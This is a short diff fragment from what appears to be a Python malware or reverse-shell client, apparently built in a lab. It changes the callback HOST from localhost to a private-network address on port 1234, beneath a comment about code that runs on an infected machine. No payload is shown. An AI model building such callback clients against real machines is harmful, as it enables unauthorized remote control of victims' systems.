@@ -12,7 +12,7 @@ import time
 
 # CODE THAT RUNS ON INFECTED MACHINE WILL GO HERE
 
-HOST = "127.0.0.1"
+HOST = "192.168.56.103"
 PORT = 1234
 
 while True:
